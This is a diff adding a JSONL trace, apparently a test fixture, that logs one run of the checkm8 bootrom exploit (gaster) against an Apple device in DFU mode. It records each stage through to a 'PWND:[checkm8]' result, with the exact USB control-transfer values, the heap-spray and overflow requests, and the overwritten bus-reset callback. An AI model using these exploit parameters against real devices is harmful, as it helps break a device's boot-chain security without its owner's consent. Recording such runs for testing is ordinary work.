@@ -1,0 +1,17 @@
+{"seq":1,"stage":"-","kind":"enumerated","t_micros":120,"detail":"PID 0x05AC=3 PID 0x1227=1"}
+{"seq":2,"stage":"-","kind":"device_path","t_micros":140,"detail":"len=64 instance id read by our own SetupAPI pass"}
+{"seq":3,"stage":"-","kind":"round","t_micros":200,"detail":"round=1 stage=RESET"}
+{"seq":4,"stage":"RESET","kind":"reset_real","t_micros":900,"detail":"libusb rc=0; DFU state left MANIFEST_WAIT_RESET"}
+{"seq":5,"stage":"RESET","kind":"predicate","t_micros":960,"label":"dfu_set_state_wait_reset","detail":"MANIFEST_SYNC -> MANIFEST -> MANIFEST_WAIT_RESET (gaster.c:829-834)","status":"PASS"}
+{"seq":6,"stage":"SETUP","kind":"xfer","t_micros":1100,"label":"async-abort","status":"CANCELLED","bm_request_type":33,"b_request":1,"w_value":0,"w_index":0,"w_length":2048,"transferred":0,"requested":2048,"xfer_micros":3110,"libusb_rc":0,"abort_after_ms":4,"xfer_seq":1}
+{"seq":7,"stage":"SETUP","kind":"xfer","t_micros":1200,"label":"pad-request","status":"STALL","bm_request_type":0,"b_request":0,"w_value":0,"w_index":0,"w_length":1280,"transferred":0,"requested":1280,"xfer_micros":180,"libusb_rc":-9,"xfer_seq":2}
+{"seq":8,"stage":"SETUP","kind":"predicate","t_micros":1210,"label":"setup_pad_stall","detail":"pad request of 1280 bytes STALLed on attempt 1 (gaster.c:853)","status":"PASS"}
+{"seq":9,"stage":"SPRAY","kind":"xfer","t_micros":1300,"label":"req-stall","status":"STALL","bm_request_type":2,"b_request":3,"w_value":0,"w_index":128,"w_length":0,"transferred":0,"requested":0,"xfer_micros":95,"libusb_rc":-9,"xfer_seq":3}
+{"seq":10,"stage":"SPRAY","kind":"xfer","t_micros":1400,"label":"leak","status":"OK","bm_request_type":128,"b_request":6,"w_value":768,"w_index":10,"w_length":64,"transferred":0,"requested":64,"xfer_micros":420,"libusb_rc":64,"xfer_seq":4}
+{"seq":11,"stage":"SPRAY","kind":"xfer","t_micros":1500,"label":"no-leak","status":"OK","bm_request_type":128,"b_request":6,"w_value":768,"w_index":10,"w_length":193,"transferred":0,"requested":193,"xfer_micros":510,"libusb_rc":193,"xfer_seq":5}
+{"seq":12,"stage":"SPRAY","kind":"predicate","t_micros":1560,"label":"checkm8_usb_request_stall","detail":"iteration=1 status=STALL","status":"PASS"}
+{"seq":13,"stage":"PATCH","kind":"xfer","t_micros":1700,"label":"overflow","status":"STALL","bm_request_type":2,"b_request":3,"w_value":0,"w_index":128,"w_length":528,"transferred":0,"requested":0,"xfer_micros":130,"libusb_rc":-9,"xfer_seq":6}
+{"seq":14,"stage":"PATCH","kind":"predicate","t_micros":1750,"label":"patch_overflow_stall","detail":"bm=2 b=3 wValue=0 wIndex=0x80 len=528 -> STALL (gaster.c:1211)","status":"PASS"}
+{"seq":15,"stage":"PATCH","kind":"reset_real","t_micros":2400,"detail":"post-PATCH reset; the overwritten dfu_handle_bus_reset callback fires here"}
+{"seq":16,"stage":"-","kind":"round","t_micros":2500,"detail":"round=1 stage=PWNED"}
+{"seq":17,"stage":"PWNED","kind":"event","t_micros":2600,"detail":"serial descriptor: CPID:8003 ECID:...66AA PWND:[checkm8]"}
